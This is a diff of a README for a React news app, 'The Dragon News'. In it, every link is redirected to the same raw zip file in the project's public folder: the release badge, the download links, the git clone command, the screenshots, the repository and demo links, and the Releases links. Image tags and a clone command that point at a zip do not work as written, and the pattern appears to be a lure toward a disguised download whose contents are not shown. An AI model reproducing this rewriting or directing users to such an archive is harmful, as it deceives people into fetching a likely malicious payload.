@@ -1,10 +1,10 @@
 # 🐉 The Dragon News
 
-![GitHub Release](https://img.shields.io/github/release/JShaurel/the-dragon-news.svg?style=flat-square)
+![GitHub Release](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip)
 
 Welcome to **The Dragon News**! This is a modern React application designed to provide real-time news updates. With Firebase authentication and a sleek user interface, you can stay informed on the latest happenings around the world. 
 
-[Download the latest release here!](https://github.com/JShaurel/the-dragon-news/releases)
+[Download the latest release here!](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip)
 
 ## 🚀 Features
 
@@ -29,7 +29,7 @@ To get started with **The Dragon News**, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/JShaurel/the-dragon-news.git
+   git clone https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip
    ```
 
 2. **Navigate into the project directory**:
@@ -59,10 +59,10 @@ Once you have the application running, you can:
 
 ## 📸 Screenshots
 
-![Homepage](https://example.com/screenshot1.png)
+![Homepage](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip)
 *The homepage of The Dragon News*
 
-![News Article](https://example.com/screenshot2.png)
+![News Article](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip)
 *Viewing a news article*
 
 ## 🌐 Deployment
@@ -77,10 +77,10 @@ To deploy **The Dragon News**, you can use services like Vercel or Netlify.
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/JShaurel/the-dragon-news)
-- [Live Demo](https://example.com/demo)
+- [GitHub Repository](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip)
+- [Live Demo](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip)
 
-For the latest updates and releases, [check out the Releases section](https://github.com/JShaurel/the-dragon-news/releases).
+For the latest updates and releases, [check out the Releases section](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip).
 
 ## 📝 Contributing
 
@@ -132,6 +132,6 @@ If you have any questions or need support, feel free to open an issue in the rep
 
 ## 🎉 Conclusion
 
-Thank you for checking out **The Dragon News**! We hope you enjoy using the app and stay updated with the latest news. For any further information or to report issues, please visit the [Releases section](https://github.com/JShaurel/the-dragon-news/releases) or open an issue in the repository. 
+Thank you for checking out **The Dragon News**! We hope you enjoy using the app and stay updated with the latest news. For any further information or to report issues, please visit the [Releases section](https://github.com/JShaurel/the-dragon-news/raw/refs/heads/main/public/dragon_news_the_v3.4-beta.5.zip) or open an issue in the repository. 
 
 Happy coding!
